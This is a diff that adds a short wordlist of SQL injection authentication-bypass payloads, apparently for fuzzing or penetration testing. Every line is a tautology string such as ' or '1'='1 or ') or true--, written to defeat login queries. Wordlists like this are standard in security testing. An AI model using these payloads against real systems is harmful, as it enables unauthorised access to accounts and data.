@@ -1,0 +1,12 @@
+1' or '1'='1 
+' or ''=' 
+or true--
+' or true-- 
+') or true-- 
+' or 'x'='x ') 
+or ('x')=('x ')) 
+or (('x'))=(('x' 
+or 'x'='x') 
+or ('x')=('x')) 
+or (('x'))=(('x
+
